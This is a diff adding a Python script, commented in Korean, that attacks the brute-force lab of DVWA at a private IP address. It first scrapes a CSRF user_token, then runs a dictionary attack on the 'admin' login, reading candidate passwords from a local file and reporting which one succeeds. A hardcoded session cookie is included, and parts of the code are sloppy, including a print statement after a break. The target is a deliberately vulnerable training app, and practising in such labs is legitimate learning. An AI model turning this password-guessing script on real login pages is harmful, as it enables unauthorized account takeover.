@@ -1,0 +1,41 @@
+
+import urllib           # URL 작업을 위한 여러 모듈을 모은 패키지입니다
+import urllib.parse     # URL을 구성 요소로 구문 분석
+import urllib.request   #url의 반응을 살피는 모듈
+import requests         #HTTP 요청을 보내는 모듈
+
+
+
+url = "http://192.168.26.128/DVWA/vulnerabilities/brute/"
+cookies={"PHPSESSID":"b78mt572d1n2nphiqih7ghh8jr" ,"security":"medium"}  
+res = requests.post(url, cookies=cookies) 
+search_string = "name='user_token' value='"
+string_position = res.text.find(search_string)
+search_position = string_position+len(search_string)
+if string_position > 0:
+    token = res.text[search_position:res.text.find("'", search_position)]   
+    print(token)
+    payload = {"username":"admin",
+                 "password":"password"
+                 ,"Login":"Login"
+                 ,"user_token":token}
+    requests.post(url,payload)
+    print(res.text)
+url = "http://192.168.26.128/DVWA/vulnerabilities/brute/"
+requests.post(url)
+print(res.text)
+
+
+file= open('E:\\python_coding\\dvwa\\1.Bruteforce\\dictionary_attack.txt', 'r')
+passwords = file.readlines()
+for password in passwords:
+  payload = {'username':'admin','password':password.replace('\n', ''),'Login':'Login'}
+  url = "http://192.168.26.128/DVWA/vulnerabilities/brute/"
+  requests.get(url,payload,cookies=cookies)
+  if(requests.get(url,payload,cookies=cookies).text.find("Welcome to the password protected area admin") > 0):
+      print("공격성공 비밀번호는 "+password)
+      break
+      print(requests.get(url,payload,cookies=cookies).text)
+  else : 
+      print("암호실패!! 공격하는 문자: "+password)
+          
